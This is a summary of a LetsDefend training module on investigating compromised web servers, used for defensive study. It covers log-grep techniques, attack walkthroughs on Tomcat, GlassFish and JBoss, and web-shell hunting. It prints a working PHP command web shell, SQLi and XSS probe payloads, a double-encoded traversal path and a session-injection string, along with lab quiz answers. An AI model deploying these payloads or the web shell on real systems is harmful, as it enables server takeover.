# LetsDefend: Hacked Web Server Analysis Module Summary

**Table of Contents:**

- [Introduction to Hacked Web Server Analysis](#introduction-to-hacked-web-server-analysis)
- [Log Analysis on Web Servers](#log-analysis-on-web-servers)
- [Attacks on Web Servers](#attacks-on-web-servers)
- [Attacks Against Web Applications](#attacks-against-web-applications)
- [Vulnerabilities on Servers](#vulnerabilities-on-servers)
- [Vulnerabilities in Programming Language](#vulnerabilities-in-programming-language)
- [Discovering the Web Shell](#discovering-the-web-shell)
- [Hacked Web Server Analysis Example](#hacked-web-server-analysis-example)
- [Training Labs](#training-labs)


# **Introduction to Hacked Web Server Analysis**

## ****Introduction to Log Analysis

Log recording is the recording of events that occur on the server. Thanks to the log records, undesired situations such as system errors and security risks can be analyzed.
In log analysis, the analyst must know what they are looking for. Considering that there are all kinds of activity records in the log files, it will be very troublesome to reach the result without filtering.
Thus, it is crucial to pay attention to 3 steps during log analysis:

1. Accessing the logs
2. Determining the purpose for which log analysis will be carried out
3. Extracting data by filtering log records for your intention

# Log Analysis on Web Servers

## General notes

- Web servers log requests in **access.log** (requests) and **error.log** (server errors).
- **POST bodies are often not recorded** in standard web server logs. To capture POST payloads you can:
    - Enable modules/features like **mod_forensic** or **mod_security** (Apache), or enable request/body capture in your WAF/proxy.
    - Otherwise inspect network traffic (e.g., **Wireshark**) or proxy logs that include request bodies.
- URL encoding (percent-encoding) must be decoded to read payloads (e.g., `%20`, `%27`, `%3B`).

## Apache — investigating an SQL injection incident

Typical workflow and key commands:

1. Inspect logs:
    - `cd /var/log/apache2`
    - `cat access.log` / `cat error.log`
2. Search for SQLi indicators (URL encoded or raw):
    
    ```bash
    cat access.log | grep -E "%27|--|union|select|from|or|@|version|char|varchar|exec"
    ```
    
3. Filter successful responses (HTTP 200):
    
    ```bash
    cat access.log | grep ' 200 '
    ```
    
4. URL-decode suspicious request paths to reveal SQL payloads.
    - Example decoded URL:
        
        `/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;`
        
5. Correlate attacker IP activity:
    
    ```bash
    cat access.log | grep 192.168.2.232 | grep admin/index.php
    ```
    
    - If attacker used POST to log in, capture the POST body via packet capture to confirm login (Wireshark).
6. If POST bodies are required for future detection, enable mod_security/mod_forensic or capture at the proxy/network.

**Key takeaways:** many SQLi probes come from same IP; search for SQL keywords, decode URLs, and check for POST login events via network captures.

---

## Nginx — detecting directory traversal attacks

Typical workflow and key commands:

1. Log location: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`.
2. Search for traversal patterns:
    
    ```bash
    cat access.log | grep '\.\./'
    # or for Windows-style
    cat access.log | grep '\.\.\\'
    ```
    
3. Look for attempts to access files like `/etc/passwd` and follow-up behavior (e.g., attacker using `wget` to exfiltrate copied pages).
4. If a file was exfiltrated, examine the fetched page for sensitive contents (like `passwd` entries).

**Key takeaways:** filter for `../` or `..\` in requests; follow chain from access to data exfiltration (wget/curl) attempts.

---

## IIS — log location

- IIS logs are under:
    
    `C:\inetpub\logs\LogFiles\W3SVC1\`
    
    (Review access records and error events similarly to Apache/Nginx.)
    

---

## Practical analysis tips & commands (cross-server)

- Always URL-decode suspicious request URIs when investigating.
- Grep patterns to look for (SQLi): `union`, `select`, `-`, `%27` (encoded `'`), `exec`, `char`, `version`.
- Grep patterns to look for (traversal): `\.\./` and `\.\.\\`.
- Filter successful responses to find likely successful exploit attempts: `grep ' 200 '` (or match your log format).
- To capture POST body data: use WAF/mod_security, forensic modules, proxy capture, or packet capture (Wireshark/tcpdump).
- Correlate log hits by **client IP**, **timestamp**, **user-agent**, and **request path**.
- When you find a suspicious request, extract full raw request, network capture (if available), and any application logs/error stacks around the same time.

---

## Quick SOC checklist

1. Collect access & error logs from webservers (Apache/Nginx/IIS).
2. Search logs for attack indicators (SQL keywords, `../`, template delimiters, encoded payloads).
3. URL-decode matched URIs and re-evaluate payload content.
4. Filter by HTTP 200 to find successful responses.
5. If POSTs are relevant but not logged, enable request-body logging (mod_security/mod_forensic/WAF) or check packet capture.
6. Correlate with application logs for successful authentication or sensitive file reads.
7. Contain (block IP, WAF rule) and remediate code/config (input validation, patching).
8. Preserve logs and captures for forensics and reporting.

## Q&A

Q1. In what year was the request made to the "/letsdefend.html" path of the Nginx web server?

- Answer Format: xxxx
- Sample Answer: 2016

<img width="920" height="250" alt="image" src="https://github.com/user-attachments/assets/e6605f65-88cb-41fc-aa86-4963463dc2f5" />

*Ans: 2022*

Q2. What is the IP address trying to read the /etc/passwd file on the Nginx web server?

- Answer Format: X.X.X.X

```bash
grep "/\etc/\passwd" access.log*
```

<img width="898" height="228" alt="image" src="https://github.com/user-attachments/assets/1746bd81-c71b-4b06-8acb-e241026de742" />

*Ans: 91.93.236.194*

Q3. What is the IP address that attempted SQL injection attack on Apache2 web server?

- Answer Format: X.X.X.X

<img width="895" height="194" alt="image" src="https://github.com/user-attachments/assets/b50ed648-2492-41e4-bc7f-783e20dcd3e5" />

*Ans: 91.93.236.194*

# Attacks on Web Servers

## Overview

Attacks on web/application servers usually exploit vulnerabilities in the web server, application server, or the hosted web application (misconfiguration, default creds, missing patches). Common outcomes: auth bypass, directory traversal, upload of webshells, remote code execution (RCE), and command shells / meterpreter sessions. Logs (access/error) and network captures are essential for detection and forensics.

---

## Tomcat (mod_jk + double-encoded traversal → manager access → deploy webshell)

**Attack technique**

- Vulnerability arises when `mod_jk` + application decodes URL parts twice.
- Double-encoding `".."` → `%2e` → `%252e` allows bypassing path checks:
    
    ```
    /examples/jsp/%252e%252e/%252e%252e/manager/html
    ```
    
- This can expose the Tomcat manager login panel; attacker may use default credentials to log in and deploy a WAR (webshell).
    
    <img width="514" height="304" alt="image" src="https://github.com/user-attachments/assets/a9c1b78c-f513-404e-b88f-d3d493e0f5bf" />

    
- Before the prepared webshell is loaded, “`/examples/jsp/%252e%252e/%252e%252e/`” is added to the beginning of the action part of the deploy button. After the process, the webshell is loaded.
    
    <img width="488" height="358" alt="image" src="https://github.com/user-attachments/assets/466f58c6-8edd-4448-b627-a61fb6e6130b" />

    
- Then, the desired commands can be run by going to the "`/examples/jsp/%252e%252e/%252e%252e/test`" path. The screenshot of the path with Webshell is given below:

<img width="647" height="334" alt="image" src="https://github.com/user-attachments/assets/d197a2f9-c92b-4c83-b001-8bfb75ee6532" />


**Log & network indicators**

- Search access logs for manager hits:

```bash
cat /var/log/apache2/access.log | grep manager/html | grep 200
```

<img width="870" height="57" alt="image" src="https://github.com/user-attachments/assets/2ca7433c-2e09-4369-9600-0bdb323d0aa7" />

- Filter by attacker IP and 200 responses:

```bash
cat access.log | grep 192.168.68.1 | grep 200
```

<img width="876" height="592" alt="image" src="https://github.com/user-attachments/assets/af6c9b3d-c828-40dd-a033-d7f015d428be" />

- Capture POST body with Wireshark:

```
ip.src == 192.168.68.1 && http.request.method == POST
```

<img width="753" height="166" alt="image" src="https://github.com/user-attachments/assets/60264ac5-c450-40c1-b96a-992636a592be" />

- Evidence: uploaded `test.war`, subsequent requests to webshell path.

**Mitigation**

- Update/fix `mod_jk`.
- Harden manager access (disable if unused, strong credentials, restrict by IP).

---

## GlassFish (CVE-driven RCE, Metasploit exploitation)

**Attack technique**

- Known RCE (e.g., CVE-2011-0807) exploited via upload or deploy mechanisms; Metasploit has `exploit/multi/http/glassfish_deployer`.
- Attack flow: port scan
    
    <img width="638" height="327" alt="image" src="https://github.com/user-attachments/assets/1a336a48-39dd-4300-b1fa-a1b97388d0af" />

    
- → identify GlassFish → run exploit → obtain meterpreter shell.
    
    <img width="734" height="490" alt="image" src="https://github.com/user-attachments/assets/4d7ebbe8-3662-4e42-b7a3-daed83af29a0" />

    
    Use the exploit, and set the required values, then run the exploit
    
    <img width="665" height="287" alt="image" src="https://github.com/user-attachments/assets/eff2d7f9-887e-4c9b-88d7-cd873b3479ca" />

    
    After the exploit is run, our meterpreter session is prepared and we can run commands on the target. Below is a screenshot showing that the Meterpreter session is active and the command is executable on the target.
    
    <img width="538" height="172" alt="image" src="https://github.com/user-attachments/assets/bac6461d-f9c8-4c50-8185-9c96e37a8c61" />

    

**Log & network indicators**

- `netstat -an` may reveal outbound/inbound connections on attacker ports (e.g., 4444).
    
    <img width="557" height="330" alt="image" src="https://github.com/user-attachments/assets/3b405183-0111-4899-81b2-addc8009d19c" />

    
- Web logs show GET requests used by the exploit sequence; large TCP flows afterwards (encrypted due to Metasploit/AES).
    
    <img width="1024" height="52" alt="image" src="https://github.com/user-attachments/assets/2aa57021-ed3d-4afb-b775-900952e373e9" />

    
- Monitor for unusual requests to admin/deployer endpoints and new long-lived outbound connections from application host.

**Mitigation**

- Change default credentials; remove or secure admin interfaces.
- Apply vendor patches and updates.
- Restrict network access to admin interfaces.

---

## JBoss (RCE via vulnerable JBoss versions)

**Attack technique**

- Public exploits (e.g., exploit-db [36575](https://www.exploit-db.com/exploits/36575/)) target JBoss AS 3–6; typical flow: run exploit script → remote shell → execute commands (`whoami`, `uname -a`).
    
    ```bash
    python 36575.py http://192.168.2.105:8080
    ```
    
   <img width="811" height="460" alt="image" src="https://github.com/user-attachments/assets/5d3c9d6e-8e19-41a9-abb7-a230fae2a418" />

    
    Then the exploit is performed and the shell appears on the screen. "`Whoami`" and "`uname -a`" commands are run on this screen.
    
    <img width="807" height="462" alt="image" src="https://github.com/user-attachments/assets/51ab134a-7955-4c06-89e1-0aa173e5c029" />

    
- Exploit often drops or triggers a JSP webshell (e.g., `jbossass.jsp`) under a writable webapp directory.

**Log & file-system indicators**

- HTTP requests containing command-like parameters (`id`, `whoami`, `uname -a`) or requests to odd JSP paths (e.g., `/jbossass/jbossass.jps`).
    
    <img width="642" height="81" alt="image" src="https://github.com/user-attachments/assets/41ed9eef-b285-464a-9f53-880976898434" />

    
    When the details of the relevant packets are examined, the response returned by the server and the address of the request is seen.
    
    <img width="1024" height="290" alt="image" src="https://github.com/user-attachments/assets/4a1e5662-aec3-4901-a196-06d4d3b72fee" />

    
    As seen in the records, requests are made to "`/jbossass/jbossass.jps`" path. The file where the request is made is searched on the server with the command below:
    
- Find webshell artifacts:

```bash
find /opt/jboss-6.0.0.Final/ -type f -name "jbossass.jsp"
```

- Inspect JSP source for backdoor code.

<img width="721" height="87" alt="image" src="https://github.com/user-attachments/assets/66ee507b-7528-41f7-8f1b-cdb78805e907" />

Below is a screenshot of the source code of the "jbossass.jsp" file. When the related file is examined, as seen that it is a webshell.

<img width="731" height="510" alt="image" src="https://github.com/user-attachments/assets/175f947e-f71c-43fc-a187-8e9c61a465e4" />

**Mitigation**

- Upgrade to supported JBoss EAP versions (e.g., 7+).
- Run services with least privilege (not as root).
- Remove unused management endpoints and secure deployment interfaces.

## Q&A

**Q1. The attacker with the IP address “91.93.236.194” made various XSS attempts on the Apache2 server. On what September day happened this attack? (??/Sept/2022)**

- **Answer Format:** Number(1-31)

<img width="895" height="551" alt="image" src="https://github.com/user-attachments/assets/3d49d860-3e24-4f12-9ed4-038fd6c227fb" />

*Ans: 27*

**Q2. What is the name of the attack that the IP address “156.146.59.9” tried on the Apache2 web server?**

- Answer Format: XXX

<img width="930" height="509" alt="image" src="https://github.com/user-attachments/assets/012e91d4-0d9b-448d-95da-67b68fbfeae1" />

*Ans: XSS*

**Q3. What is the User Agent information of the POST request sent to the Apache2 web server on “27/Sep/2022 10:56:39“?**

- Answer Format: X/X.X.X

<img width="882" height="123" alt="image" src="https://github.com/user-attachments/assets/dfd0ced6-d929-4d95-9baf-9e29c91b3be2" />

*Ans: PostmanRuntime/7.29.2*

# Attacks Against Web Applications

## 1) Injection (SQL Injection)

**What it is**

Manipulating input so the server runs attacker-controlled SQL. Can be logic-based, UNION-based, time-based, etc.

**Common detection payloads / probes**

- `'` (single quote), `-` (comment)
- `ORDER BY` (to detect column count): `?id=6 ORDER BY 6--`
- UNION-based type detection: `?id=6 UNION SELECT 1,null,null--`
- Logic-based tests: `?id=6 OR 1=1`, `?id=7-1`, `?id=6 OR 11-5=6`
- Time-based tests: `SLEEP(25)--`, `SELECT BENCHMARK(1000000,MD5('A'))`, `userID=1 OR SLEEP(25)=0 LIMIT 1--`

**Example exploit flow**

- Attacker sends: `' or 0=0 union select null, version() #` → application returns DB version (data leak).
    
    <img width="373" height="399" alt="image" src="https://github.com/user-attachments/assets/ca685be4-e25d-47f4-84c1-d24cd29a5aca" />

    

**Log indicators/grep**

```bash
cat access.log | grep -E "%27|--|union|select|from|or|@|version|char|varchar|exec"
# Filter successful responses (HTTP 200)
cat access.log | grep ' 200 '
```

URL-decode suspicious paths to read SQL payloads.

<img width="833" height="501" alt="image" src="https://github.com/user-attachments/assets/1c662044-4579-4bb2-a6f2-b182a2833f56" />

**Mitigations**

- Use prepared/parameterized queries.
- Strict input validation/whitelisting.
- Principle of least privilege for DB accounts.
- Filter/escape input where appropriate.

---

## 2) Broken Authentication & Session Management

**What it is**

Weak session handling or predictable/unsafely stored session identifiers allowing account takeover.

**Example attack**

- Session cookie equals username. Attacker edits cookie value from `user1` → `admin` and gains admin access.
    
    <img width="557" height="389" alt="image" src="https://github.com/user-attachments/assets/fb69038d-7a44-4a7b-81e7-d84b1e2991bb" />

    Changing the Username to admin to take over the admin’s session
    
    <img width="557" height="389" alt="image" src="https://github.com/user-attachments/assets/2a002fcf-3635-4096-8fdc-19b3086a3b1d" />

    
    As a result, without using any password, only the cookie value was changed and the admin user was switched.
    

**Log / network signs**

- Access logs may not show anything unusual; packet capture or proxy inspection reveals modified cookie values between requests.
    
   <img width="738" height="261" alt="image" src="https://github.com/user-attachments/assets/e7f19c3b-71c0-44cc-b087-b7875dc1d39f" />

    
- Compare subsequent requests from same IP for changed cookie values.
    
    A screenshot of the cookie value of the user entering the system from the `192.168.68.1` IP address is given below:
    
    ![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-42.png)
    
    The screenshot of the cookie value in the second request sent to the system from the same IP address is given below:
    
    ![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-43.png)
    
    As seen in the screenshots, the person connecting to the system from the same IP address has changed the cookie values and switched to the "`admin`" user.
    

**Mitigations**

- Use strong, unpredictable session identifiers.
- Proper server-side session mapping (don’t trust client-provided identity).
- Protect cookies (HttpOnly, Secure, SameSite) and prevent XSS so cookies aren’t stolen.

---

## 3) Cross-Site Scripting (XSS)

**What it is**

Injection of client-side scripts (HTML/JS) into web pages viewed by other users, enabling cookie theft, redirect, actions as victim.

**Example payloads**

- Classic: `"><script>alert(1)</script>`
- Event handlers: `onload=...`, `onclick=...`, `onerror=...` etc.

**Detection**

- XSS commonly appears in GET and POST inputs: search logs for `<`, `>`, `alert`, `script`, `src`, `cookie`, `onerror`, `document`.

```bash
cat access.log | grep -E "%3C|%3E|alert|script|src|cookie|onerror|document"
```

- Examine POST bodies (may require proxy/WAF or packet capture) to see injected payloads.

**Example flow**

- Attacker posts JS to guestbook. Later visitors execute the script (popup or cookie exfiltration).
    
    <img width="578" height="124" alt="image" src="https://github.com/user-attachments/assets/b4469b83-0c85-4a01-983d-88b13469df4f" />

    
    Users who visit the page after the message is sent are affected by the code written.
    
    Below is a screenshot showing that the user visiting the page is affected by the JavaScript code.
    
    ![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-45.png)
    
    Looking at the source code of the page, it is seen that the javascript code has been added.
    
    ![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-46.png)
    

**Log Records:**

When the log records are examined, it is seen that data is sent to the page related to the POST method.

<img width="802" height="77" alt="image" src="https://github.com/user-attachments/assets/0fbe9a02-24ed-46e0-b804-f1189197b222" />

Network traffic is inspected to see the details.

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-48.png)

As can be seen in the records of the examined traffic, JavaScript code was injected into the attacker message section. In order to detect XSS attacks performed with the GET method, it is necessary to filter some keywords in the log files. The most used characters and words in XSS attacks are `<, >, alert, script, src, cookie, onerror`, `document`. While filtering the search with the grep command, it is necessary to search for the URL encoded version of the '`<`' and '`>`' characters.

As a result;

```bash
**cat access.log | grep -E "%3C|%3E|alert|script|src|cookie|onerror|document"**
```

A command appears. A screenshot of an example XSS attack detection is given below:

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-49.png)

**Mitigations**

- Validate and sanitize inputs; prefer whitelisting.
- Context-specific output encoding (HTML-escape, attribute-escape).
- Use CSP and HttpOnly cookies; protect against DOM XSS.

---

## 4) Security Misconfiguration

**What it is**

Default or weak configs (default credentials, open services) that enable straightforward compromise.

**Example**

- Default admin username/password left unchanged → attacker logs in.

**Mitigations**

- Change default credentials.
- Disable unused services and ports.
- Harden configurations and keep software up to date.

---

## 5) Cross-Site Request Forgery (CSRF)

**What it is**

Forces an authenticated user’s browser to perform an unwanted action (change password, transfer funds) by submitting forged requests.

**Attack Sample**

- In this sample attack, our goal will be to change the victim's password by sending a request to the target application with a fake web page.
- There is only a "`click`" button on the fake web page. The screenshot of the relevant button is given below:
    
    ![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-50.png)
    
- A screenshot of the source code of the fake page is given below:
    
    ![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/img2new-1.png)
    
- The following action will be taken on our fake page; If the victim clicks the "`click`" button, they will send a request to the target application that they want to change their password to `123456`.
- And the password of the user who clicked the button will be changed. The relevant screenshot is given below:

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-52.png)

**Log Records**

- When the log records are examined after the attack, it is seen that the victim requested a password to the application and the user's password was changed.
    
    ![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/img1new-1.png)
    

**Mitigations**

- Use CSRF tokens tied to user sessions and require them for state-changing requests.
- Use SameSite cookie attribute where appropriate.
- Use framework-provided CSRF protections.

# Vulnerabilities on Servers

This lesson provides examples of vulnerabilities in **IIS** , Apache, and Nginx web servers, along with instructions on how to exploit them. Instead of summarizing the content, I will list some of the TryHackMe free room and challenges that covers vulnerabilities in these web servers and how to detect them: 

- Detect web attack on  *Nginx logs →* https://tryhackme.com/room/apiwizardsbreach
- Detecting web attacks → https://tryhackme.com/room/detectingwebattacks

# Vulnerabilities in Programming Language

## PHP — **CVE-2016-10033** (PHPMailer / `mail()` extra parameter RCE)

**What it is**

- A remote code execution (RCE) vulnerability affecting PHPMailer and PHP usage of `mail()` when the “additional parameters” (4th argument) are not properly validated.
- Attackers can inject shell commands via crafted input that reaches the extra-parameters string.

**Exploit flow (example):** 

**The relevant exploit can be downloaded from the link given below:** 

- https://github.com/opsxcq/exploit-CVE-2016-10033
- A vulnerable web app using PHPMailer is targeted with an exploit (public PoC available, e.g., `opsxcq/exploit-CVE-2016-10033`).
- After exploitation, attacker drops/contacts a backdoor (example path `backdoor.php`) and issues commands.
    
    <img width="764" height="256" alt="image" src="https://github.com/user-attachments/assets/bb499156-f2dc-44d6-97e4-90070394a746" />

    

**Log / network indicators**

- Unusual GET requests to webshell/backdoor endpoints (e.g., `/backdoor.php`).
    
    <img width="548" height="176" alt="image" src="https://github.com/user-attachments/assets/dd845c66-1fb9-4a27-9d19-34dd1d128865" />

    
- Payloads or command blobs included in requests which may be base64-encoded — decoding reveals executed commands.
    
<img width="567" height="107" alt="image" src="https://github.com/user-attachments/assets/144763ec-ac3b-4025-98e9-246bd1bfa094" />
    
- Sudden suspicious web requests followed by abnormal outbound activity from the host.

**Mitigation / fix**

- Upgrade PHP/PHPMailer to versions that patch CVE-2016-10033.
- Never pass untrusted input into `mail()` additional-parameters; sanitize/whitelist values.
- Monitor logs for webshell patterns and base64 payloads; remove any webshells and rotate credentials if compromise is suspected.

---

## 2) Java — **Play Framework session injection (null-byte / session encoding issue)**

**What it is**

- A session-injection/logic flaw in certain versions of the Play Framework where crafted bytes in submitted data (e.g., null bytes `%00`) cause the server to misinterpret session fields — allowing attackers to set session attributes (e.g., `admin:1`) and escalate privileges.

**Exploit flow (example)**

- Attacker registers a normal user, intercepts the registration request (e.g., via Burp), and appends a crafted value such as:
    
    ```
    %00%00admin%3a1%00
    ```
    
    to the username field (null bytes + `admin:1` marker).
    
    <img width="947" height="229" alt="image" src="https://github.com/user-attachments/assets/4e84eb2b-65eb-4cc7-81a9-e43c22fccac0" />

    
    The parameter `00%00admin%3a1%00` is added to the end of the username on the sent request.
    
    <img width="736" height="62" alt="image" src="https://github.com/user-attachments/assets/24105042-a0d1-40c0-8f06-a6285d090b70" />

    
- On server-side session encoding/decoding, this causes `admin:1` to be interpreted as a session attribute, granting admin privileges.

**Log / network indicators**

- Access logs may show normal registration requests, but cookie/session values (examined via proxy or app logs) reveal injected or malformed session data.
    
    <img width="729" height="87" alt="image" src="https://github.com/user-attachments/assets/3247ff69-d1d9-4a18-9639-69af5a092960" />

    
- Post-registration responses show elevated privileges for that account.
    
    The screenshot of the post-registration request and the server's response are given below:
    
    <img width="1024" height="434" alt="image" src="https://github.com/user-attachments/assets/edf97296-05dc-4b28-b900-e6eb9764d091" />

    

**Mitigation / fix**

- Update Play Framework/application to versions that fix the session encoding parsing bug.
- Properly validate and canonicalize user input (reject/control null bytes and control characters).
- Use safe session encoding mechanisms and verify session integrity (signed/encrypted cookies, HMAC checks).
- Inspect session handling code for any parsing edge-cases and add server-side checks that disallow unexpected attributes from untrusted input.

### Additional resources:

- https://www.wiz.io/academy/code-vulnerabilities
- https://www.aabri.com/LV2013Manuscripts/LV13090.pdf

---

# Discovering the Web Shell

## What a web shell is

A **web shell** is a script uploaded to a webroot that gives an attacker remote control (run commands, upload files, etc.). Common PHP shells call system functions (e.g. `system()`) or execute arbitrary PHP (e.g. `eval()`).

Source: https://www.revshells.com/

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

## High-value functions & keywords to search for

When hunting for PHP shells, scan for functions and tokens commonly used by shells:

- Execution / passthrough: `system`, `shell_exec`, `passthru`, `exec`, `popen`
- PHP execution/evaluation: `eval`, `assert`
- File / I/O: `fopen`, `fclose`, `readfile`, `file_get_contents`, `fwrite`, `chmod`, `mkdir`
- Info / fingerprinting: `phpinfo`, `php_uname`
- Encoding/obfuscation: `base64_decode`, encoded variants (e.g. `edoced_46esab`)
- Others to check: `preg_replace` (used with `/e` or callbacks), `exif_read_data` (used to hide code in image EXIF)

---

## Practical search commands shown

Scan the webroot for suspicious function usage:

```bash
# Find files calling system()
grep -Rn "system *(" /var/www

# Broader scan for many common shell functions (PCRE, recursive)
grep -RPn "(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval) *\(" /var/www

```

Also scan for EXIF / preg_replace usage:

```bash
grep -RPn "exif_read_data|preg_replace" /var/www
```

---

## Common shell hiding techniques

Attackers often try to evade detection using:

- **Remote summoning** — the uploaded stub fetches and executes code from a remote server rather than storing the full shell locally.
    
<img width="595" height="131" alt="image" src="https://github.com/user-attachments/assets/332ab973-5ea3-4065-bf9b-4bd8bc2dc3cf" />
    
- **Encrypted/obfuscated code** — shell code is encoded (e.g. base64) or otherwise obfuscated to hide readable signatures.
    
    <img width="842" height="59" alt="image" src="https://github.com/user-attachments/assets/df528c5b-9908-48c1-a1fa-d1e953a19061" />

    
- **Hiding in images** — malicious PHP payload stored in image EXIF metadata; the PHP script reads EXIF and evals the payload. First, the desired codes are placed in the `exif`information of the image with the help of `exiftool`. The screenshot of the image whose "`exif`" information has been changed is given below**:**
    
    <img width="765" height="116" alt="image" src="https://github.com/user-attachments/assets/9568d7b2-0d50-4737-82d6-05223e7f5c42" />

    
    <img width="764" height="307" alt="image" src="https://github.com/user-attachments/assets/836c579c-1921-41a9-88ac-b48a00a4a331" />

    
    Then PHP code is written to read the exif information from the image.
    
    <img width="705" height="69" alt="image" src="https://github.com/user-attachments/assets/f9af4c4f-84fe-4708-9f42-b502c155d5b1" />

    

Because of these, static keyword searches can miss shells; include functions used to read EXIF and perform dynamic evaluation in your scans.

---

## Detection tips (implicit from the text)

- Focus initial searches on execution and decoding functions (`system`, `shell_exec`, `eval`, `base64_decode`).
- Also search for less obvious functions used in hiding (e.g. `exif_read_data`, `preg_replace`).
- Inspect files that call both I/O and exec functions (higher suspicion).
- Decode base64/blobs you find and inspect results.
- Check for calls that fetch remote content (e.g. `file_get_contents('http://...')`) or unusual network activity.

## Q&A

**Q1. There is a PHP shell on the server. What is the filename of this shell?**

- Answer format: xxx.xxx

<img width="930" height="165" alt="image" src="https://github.com/user-attachments/assets/1bd438ee-18d1-4874-850f-a5008dc947ee" />


*Ans: run.php*

**Q2. Is there a webshell hidden in the image on the server?**

I used this filter and found nothing

```bash
grep -RPn "exif_read_data|preg_replace" /var/www
```

*Ans: n*

# **Hacked Web Server Analysis Example**

**Training Lab**: Practice exploiting a website powered by WordPress→  https://tryhackme.com/room/adana?source=post_page-----2be697c7459e---------------------------------------

In this section, we will be examining a fully compromised web server running Wordpress by post-attack analysis. First, understanding whether the attacker has access to the admin panel can be discovered by entering this command below:

```bash
**cat access.log | grep POST | grep wp-login**
```

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-89.png)

As can be seen in the output in the screenshot above, many POST requests have been sent to the `admin` panel login page over the same IP address. Network traffic is examined to check the data sent with the request. For this, in Wireshark;

```bash
**Query: ip.src == 192.168.2.232 && ip.dst == 192.168.2.31 && http.request.method == POST**
```

POST requests to the web server through the attacker are listed using the filter.

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-90.png)

When the requests were examined, it was determined that a brute force attack was carried out on the "`wp-login`" page.

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-91.png)

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-92.png)

As a result of the attack, the correct username and password were found as `admin: admin`.

When the “`error.log`” file is examined, it is seen that the `fscockopen()` function is intended to be activated. Thus, it can be predicted what the attacker did in the admin panel.

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-93.png)

Looking at the file details, it was determined that it sent a request to the `/words/test123123` path. The relevant screenshot is given below:

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-94.png)

The attacker wanted to go to an inaccessible page and get a `404 Not Found`. Thus, instead of the classic 404 Not Found error page, it is thought that the code he has placed will work. We can look at the change by examining the network traffic or logging into the admin panel.

Looking at the changes, it was determined that the content of the 404 Not Found error page was changed by the attacker.

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-95.png)

The piece of code used by the attacker for the error page is shown in the screenshot below:

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-96.png)

When the code used by the attacker for the 404 error code page is examined, it is seen that he opened access to his own address on port 1234.

The attacker will have access to the server with `www-data` user rights with this door opened for himself. In this case, the commands run by the "`www-data`" user on the server are examined. Below is a screenshot of the commands the attacker ran on the server.

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-97.png)

The attacker, who read the "`wp-config.php`" file, switched to the root user. When looking at the wp-config.php file, the database password is the same as the root user's password.

A screenshot of the contents of the wp-config.php file is given below:

![](https://ld-images-2.s3.us-east-2.amazonaws.com/Hacked+Web+Server+Analysis/images/image-98.png)

With the above password, the attacker gained root authority and took over the entire server.

## **Conclusion**

As discussed in the tutorial, attackers can attack the web server in various ways to take over. In order to detect attacks, [log analysis](https://app.letsdefend.io/training/lessons/network-log-analysis) and good control of network traffic are required. For this, it is necessary to know and understand the attack vectors for effective analysis. Sometimes a security vulnerability can be caused by the server or programming language you are using. Therefore, it is necessary to keep the components on the server constantly updated.

# Training Labs

- https://app.letsdefend.io/challenge/investigate-web-attack
- https://app.letsdefend.io/challenge/http-basic-auth
